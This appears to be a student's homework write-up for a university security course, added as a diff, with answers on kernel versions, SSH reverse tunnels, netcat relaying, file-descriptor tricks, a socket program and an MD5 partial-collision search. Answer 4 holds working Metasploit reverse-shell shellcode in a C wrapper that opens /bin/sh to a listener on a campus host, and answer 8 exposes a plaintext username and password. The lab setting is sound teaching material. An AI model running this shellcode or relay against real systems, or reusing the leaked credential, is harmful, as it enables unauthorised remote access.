@@ -1,0 +1,128 @@
+1) What are the kernel versions and distros (plus versions) of Kali,
+elra*, and moxie? (Tell me how you found out!):
+
+To do all of these I looked in /proc/version
+Kali: Linux version 3.14-kali1-amd64 (debian-kernel@lists.debian.org) (gcc version 4.7.2 (Debian 4.7.2-5) ) #1 SMP Debian 3.14.5-1kali1 (2014-06-07)
+elra: Linux version 3.13.0-36-generic (buildd@toyol) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #63-Ubuntu SMP Wed Sep 3 21:30:07 UTC 2014
+moxie: Linux version 3.2.0-30-generic (buildd@batsu) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #48-Ubuntu SMP Fri Aug 24 16:52:48 UTC 2012
+
+2) Use ssh to open a port on moxie that serves a shell on Kali.
+Connect to the port on moxie from another machine and show that
+you can log in to Kali. Explain what you had to do to accomplish this.
+
+running "ssh -R 1337:localhost:22 vico4299@moxie.cs.colorado.edu" on kali will open
+up port 1337 on moxie.  Then running "ssh fatty@moxie.cs.colorado.edu -p 1337 -i
+~/.ssh/vm/id_rsa" will connect to it from my mac.
+
+3) Suppose a friend opened apache on port 80 on Kali while connected
+to campus wireless. How would you, using your own laptop on campus wireless,
+expose your friend's port 80 on moxie?
+
+Since Kali is most likely behind a NAT, and you most likely do not know it's MAC or IP
+address, this is kinda hard.  You would have to first get them to connect to a website
+and wireshark/sniff all the traffic in order to find thier IP address.  At this point
+you should be able to ssh into moxie, and use something like: "nc -l localhost -p 31337
+-c 'nc <friends ip> -p 80'"
+
+4) Using metasploit, generate a reverse shell for Kali then execute it in a
+C wrapper and demonstrate that it will connect to a server on moxie and
+give shell access.
+
+
+My code looked like:
+const unsigned char buf1[] =
+"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
+"\x48\xb9\x02\x00\x11\x5c\x80\x8a\xc9\x78\x51\x48\x89\xe6"
+"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
+"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
+"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
+"\x89\xe6\x0f\x05";
+
+int main(){
+  int (*funct1)();
+  funct1 = (int (*)()) buf1;
+  (int)(*funct1)();
+}
+I ran "nc -l -p 4444" on moxie and ran the executable on kali
+
+
+5) (a) Explain why the first window shows its directory on stdout.
+because it replaced the shell with /bin/ls and executed it
+(b) Explain why the first window's shell died
+because once ls completed, there was nothing left to run, /bin/bash had already been replaced
+
+6)(a) Why doesn't the first window die now?
+our command no longer replaces the terminal, we now make a pipe and pipe replaces stdin
+of the new shell we have created.
+(b) Explain how to recover stdin on the first window without killing and restarting its shell.
+You need to recover stdin on /dev/pts/1, like:  'exec < /dev/pts/1' >&3 for example.  the
+stdin of the target shell now executes a line that redirects the terminal stdin into fd 0,
+the shell stdin.
+
+8) Write a program that reads 4 unsigned ints sent in host byte order from
+hitchens.cs.colorado.edu port 1234 adds them up, and sends them back to that
+port. (This is a little-endian machine. Recall that "network order" is big-endian.)
+
+Username: vortex1 Password: Gq#qu3bF3
+My code looks like:
+import socket
+import struct
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('hitchens.cs.colorado.edu',1234))
+
+listt = []
+data = s.recv(1024)
+data += s.recv(1024)
+
+for i in range(0, 14, 4):
+   listt.append(struct.unpack('<I', data[i:i+4])[0])
+
+s.send( struct.pack('<Q', (sum(listt))))
+print "revceived: "
+print s.recv(1024)
+
+9) Find a Sayler 6-Collision in md5. A "Sayler 6-Collision" is a pair of distinct
+inputs whose md5sum matches in the first 6 and last 6 printed characters.
+
+My code looks like:
+
+import socket
+import struct
+import md5
+import bisect
+
+l = []
+
+for n in range(0, 100000000):
+    m = md5.new(str(n))
+    temp = m.hexdigest()
+    temp2 = temp[0:6]
+    temp3 = temp[26:32]
+    temp4 = temp2+temp3
+    i = bisect.bisect_left(l, temp4)
+    if i != len(l) and l[i] == temp4:
+        print "success on iteration " + str(n)
+        print "it looks like " + str(temp4)
+        break
+    else:
+        l.insert(i, temp4)
+    if not (n%100000):
+        print str(n) + " iterations done"
+
+Short and sweet, but python, which is slow as <expletive deleted>.  Also I forgot
+to save which iteration the specific hash was generated at, since i keep reordering my
+list around.  It doesnt really matter, because once you know which one you are looking
+for, you can run a script that takes a few seconds to find the matching iteration.  My
+two collisions were (in python):
+
+>>> import md5
+
+>>> m = md5.new(str(4308906))
+>>> m.hexdigest()
+'6e88b08bf0c9a6f2e88649511996ab34'
+>>> m = md5.new(str(6857790))
+>>> m.hexdigest()
+'6e88b0ed513e6ab8418b3437ff96ab34'
+
+This took about an hour on my macbook.
